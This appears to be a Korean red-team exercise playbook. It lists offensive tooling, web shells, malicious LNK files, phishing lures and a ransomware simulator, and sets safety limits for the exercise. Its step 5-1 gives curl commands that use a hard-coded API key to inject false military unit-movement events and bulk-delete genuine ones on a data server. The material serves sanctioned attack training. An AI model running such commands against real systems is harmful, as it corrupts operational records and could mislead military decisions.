# 사전 준비

## 레드팀 환경 구성
- 공격자 C2 서버 (훈련망 외부 또는 별도 VM)
- 도구: Metasploit, Impacket, Mimikatz, nmap, Burp Suite, sqlmap, python3
- 웹셸 풀: ASPX / PHP / JSP / Python (각 1종 이상 준비)
- 악성 LNK 파일 (msfvenom 또는 직접 제작)
- 피싱 메일 템플릿 (공문 형태 HWP/PDF 위장)
- GORGON 랜섬웨어 시뮬레이터 (실제 암호화 대신 파일명 변경 + 랜섬노트 생성)

## 주의사항
- OT 구간(SCADA, PLC)은 **태그값 변조만 허용**, 실제 프로세스 중단 금지
- GORGON 랜섬웨어는 **지정 VM에만 배포** (운영 데이터 보호)
- 각 단계 시작 전 **VMware 스냅샷 생성** 필수

## STEP 5-1. 데이터 수집·관리 서버 — 허위 이벤트 주입

**목표**: API 인증 우회 후 허위 작전 이벤트 대량 주입

**절차**

```bash
# API 키 소스코드에서 탈취 또는 하드코딩 확인
curl http://<데이터수집서버_IP>/api/v1/events \
  -H "X-API-Key: <하드코딩된_키>"  # 소스코드에서 획득

# 허위 이벤트 주입 (아군 위치 오기입)
curl -X POST "http://<데이터수집서버_IP>/api/v1/events" \
  -H "X-API-Key: <API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "unit_movement",
    "unit_id": "ALPHA-01",
    "location": {"lat": 38.5, "lng": 127.3},
    "status": "advancing",
    "timestamp": "2024-11-04T14:00:00Z"
  }'

# 기존 정상 이벤트 삭제
curl -X DELETE "http://<데이터수집서버_IP>/api/v1/events/batch" \
  -H "X-API-Key: <API_KEY>" \
  -d '{"start":"2024-11-04T00:00:00Z","end":"2024-11-04T12:00:00Z"}'
```
